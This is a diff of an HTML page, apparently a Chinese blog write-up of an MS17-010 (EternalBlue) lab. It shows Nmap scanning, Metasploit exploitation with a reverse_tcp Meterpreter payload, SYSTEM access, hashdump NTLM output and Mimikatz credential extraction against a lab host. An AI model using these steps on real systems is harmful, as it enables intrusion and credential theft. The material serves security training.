-&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png"
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png"
 width="867"
 height="670"
 srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_f195f9051ac4a590.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_1a4fbf30a2c3580b.png 1024w"
@@ -725,6 +835,15 @@ data-flex-basis="332px"
 &gt;&lt;/p&gt;
 &lt;h4 id="四nmap扫描结果分析"&gt;四、Nmap扫描结果分析
 &lt;/h4&gt;&lt;p&gt;上述Nmap扫描结果如下所示：&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -814,10 +933,12 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ Message signing enabled but not required
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 69.41 seconds
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 69.41 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;ul&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;靶机信息&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
@@ -889,7 +1010,16 @@ data-flex-basis="332px"
 &lt;/ul&gt;
 &lt;h3 id="metasploit扫描与漏洞利用"&gt;Metasploit扫描与漏洞利用
 &lt;/h3&gt;&lt;h4 id="一启动metasploit框架root"&gt;一、启动Metasploit框架（root）：
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
 &lt;/span&gt;&lt;span class="lnt"&gt; 2
@@ -964,11 +1094,22 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Metasploit Documentation: https://docs.metasploit.com/
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id="二搜索ms17-010相关模块"&gt;二、搜索ms17-010相关模块：
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id="二搜索ms17-010相关模块"&gt;二、搜索ms17-010相关模块：
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
 &lt;/span&gt;&lt;span class="lnt"&gt; 2
@@ -1057,10 +1198,12 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Interact with a module by name or index. For example info 29, use &lt;span class="m"&gt;29&lt;/span&gt; or use exploit/windows/smb/smb_doublepulsar_rce
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;After interacting with a module you can manually &lt;span class="nb"&gt;set&lt;/span&gt; a TARGET with &lt;span class="nb"&gt;set&lt;/span&gt; TARGET &lt;span class="s1"&gt;&amp;#39;Neutralize implant&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;以上为metasploit中的ms17-010（永恒之蓝）模块。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;以上为metasploit中的ms17-010（永恒之蓝）模块。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;MS17-010 (永恒之蓝) 漏洞利用套件详解&lt;/strong&gt;&lt;/p&gt;
@@ -1190,7 +1333,16 @@ data-flex-basis="332px"
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4 id="三探测目标主机"&gt;三、探测目标主机
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
@@ -1211,12 +1363,23 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator &lt;span class="s1"&gt;&amp;#39;+&amp;#39;&lt;/span&gt; and &lt;span class="s1"&gt;&amp;#39;?&amp;#39;&lt;/span&gt; was replaced with &lt;span class="s1"&gt;&amp;#39;*&amp;#39;&lt;/span&gt; in regular expression
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Scanned &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; hosts &lt;span class="o"&gt;(&lt;/span&gt;100% &lt;span class="nb"&gt;complete&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Auxiliary module execution completed
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;关键信息：&lt;code&gt;Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;关键信息：&lt;code&gt;Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id="四漏洞利用"&gt;四、漏洞利用
 &lt;/h4&gt;&lt;p&gt;切换&lt;code&gt;exploit&lt;/code&gt;模块 -&amp;gt; 设置靶机IP -&amp;gt; 设置攻击机IP -&amp;gt; 设置载荷 -&amp;gt; 检察配置信息 -&amp;gt; &lt;code&gt;run&lt;/code&gt; -&amp;gt; 权限验证&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1340,11 +1503,22 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;View the full module info with the info, or info -d command.
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;View the full module info with the info, or info -d command.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为&lt;code&gt;windows/x64/meterpreter/reverse_tcp&lt;/code&gt;。其中&lt;code&gt;windows/x64&lt;/code&gt;指明靶机系统是64位 windows 系统；&lt;code&gt;meterpreter&lt;/code&gt;是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 &lt;code&gt;hashdump&lt;/code&gt;, &lt;code&gt;screenshot&lt;/code&gt;, &lt;code&gt;webcam_snap&lt;/code&gt;），远比普通的 CMD 命令行强大；&lt;code&gt;reverse_tcp&lt;/code&gt;指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为&lt;code&gt;windows/x64/meterpreter/reverse_tcp&lt;/code&gt;。其中&lt;code&gt;windows/x64&lt;/code&gt;指明靶机系统是64位 windows 系统；&lt;code&gt;meterpreter&lt;/code&gt;是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 &lt;code&gt;hashdump&lt;/code&gt;, &lt;code&gt;screenshot&lt;/code&gt;, &lt;code&gt;webcam_snap&lt;/code&gt;），远比普通的 CMD 命令行强大；&lt;code&gt;reverse_tcp&lt;/code&gt;指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。&lt;/p&gt;
 &lt;p&gt;PS：设置反向连接后，需要指定&lt;code&gt;lhost&lt;/code&gt;参数，以指定靶机出发漏洞后能够成功连接回攻击机&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1410,20 +1584,33 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-WIN-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：当前权限——&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; 权限（通常简称为 &lt;strong&gt;System 权限&lt;/strong&gt;）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，&lt;code&gt;SYSTEM&lt;/code&gt; 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：当前权限——&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; 权限（通常简称为 &lt;strong&gt;System 权限&lt;/strong&gt;）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，&lt;code&gt;SYSTEM&lt;/code&gt; 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;它比管理员（Administrator）更高级&lt;/strong&gt;：Administrator 仍然受用户帐户控制（UAC）的限制，而 SYSTEM 账户不受任何限制。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;权限范围&lt;/strong&gt;：它拥有对本地计算机上&lt;strong&gt;所有资源&lt;/strong&gt;（文件、注册表、进程、硬件）的完整访问权限。&lt;/li&gt;
@@ -1439,7 +1626,16 @@ data-flex-basis="332px"
 &lt;h3 id="典型的后渗透攻击行为"&gt;典型的“后渗透”攻击行为
 &lt;/h3&gt;&lt;h4 id="一凭据窃取"&gt;一、凭据窃取
 &lt;/h4&gt;&lt;h5 id="1-导出哈希值hashdump"&gt;1. 导出哈希值（Hashdump）
-&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h5&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
@@ -1452,10 +1648,12 @@ data-flex-basis="332px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047:::
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047:::&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器。&lt;/p&gt;
 &lt;p&gt;在线哈希穷举解密：&lt;a class="link" href="https://cmd5.com/" target="_blank" rel="noopener"
 &gt;CMD5&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png"
@@ -1470,6 +1668,15 @@ data-flex-basis="692px"
 &gt;&lt;/p&gt;
 &lt;h5 id="2-抓取内存中的明文密码mimikatz"&gt;2. 抓取内存中的明文密码（Mimikatz）
 &lt;/h5&gt;&lt;p&gt;&lt;code&gt;load kiwi # 加载增强版的Mimikatz&lt;/code&gt; -&amp;gt; &lt;code&gt;creds_all # 尝试提取所有凭证&lt;/code&gt;&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1565,23 +1772,36 @@ data-flex-basis="692px"
